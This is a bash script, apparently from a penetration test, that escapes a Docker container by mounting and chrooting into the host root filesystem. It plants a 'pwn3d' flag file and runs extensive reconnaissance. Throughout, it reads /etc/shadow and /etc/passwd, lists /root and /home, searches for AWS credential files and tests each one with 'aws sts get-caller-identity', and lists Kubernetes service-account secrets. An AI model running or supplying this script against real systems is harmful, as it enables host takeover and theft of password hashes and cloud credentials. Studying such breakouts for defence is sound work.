#!/bin/bash

echo "show contained procs before breakout:"
ps aux

# now breakout and recon
docker run -v /:/host enkaskal/docker-debian /bin/bash -c 'chroot /host su - root -c "echo RECON:plant ; echo pwn3d by enkaskal >> /tmp/.flag ; \
  echo RECON:confirm flag ; cat /tmp/.flag ; \
  echo RECON:env ; env ; \
  echo RECON:ps aux ; ps aux ; \
  echo RECON:/root ; ls -alR /root ; \
  echo RECON:/tmp ; ls -alR /tmp ; \
  echo RECON:/home ; ls -alR /home ; \
  echo RECON:python ; which python ; \
  echo RECON:python --version ; python --version ; \
  echo RECON:apt-get ; which apt-get ; \
  echo RECON: dpkg ; which dpkg ; \
  echo RECON: yum ; which yum ; \
  echo RECON: rpm ; which rpm ; \
  echo RECON:alpine ; cat /etc/apk/repositories ; \
  echo RECON: netstat -apn ; netstat -apn || true ; \
  echo RECON: nc ; which nc ; \
  echo RECON: base64 ; which base64 ; \
  echo RECON: /dev/tcp ; ls -l /dev/tcp ; \
  echo RECON:passwd ; cat /etc/passwd ; \
  echo RECON:shadow ; cat /etc/shadow ; \
  echo RECON:jailed ; ls -di / ; \
  echo RECON:uname -a ; uname -a ; \
  echo RECON:os-release ; cat /etc/os-release ; \
  echo RECON:install awscli ; apk -v --update add python py-pip groff less mailcap && \
    pip install --upgrade awscli && apk -v --purge del py-pip && rm /var/cache/apk/* ; \
  echo RECON:which aws ; which aws ; \
  echo RECON:credentials ; find / -name credentials -type f > /tmp/find.credentials ; \
    cat /tmp/find.credentials ; grep -v testdata /tmp/find.credentials | \
    xargs -I % echo AWS_SHARED_CREDENTIALS_FILE=% aws sts get-caller-identity > /tmp/get-caller-identities ; \
    cat /tmp/get-caller-identities ; /bin/sh /tmp/get-caller-identities ; \
  echo RECON:clean-up tmp files ; rm -f /tmp/find.credentials /tmp/get-caller-identities ; \
  echo RECON:fstab ; cat /etc/fstab ; \
  echo RECON:/proc/1 ; ls -alR /proc/1 ; \
  echo RECON:cat /proc/1/mounts ; cat /proc/1/mounts ; \
  echo RECON:/run/secrets/kubernetes.io/serviceaccount ; find /run/secrets/kubernetes.io/serviceaccount -exec ls -al {} \;"'
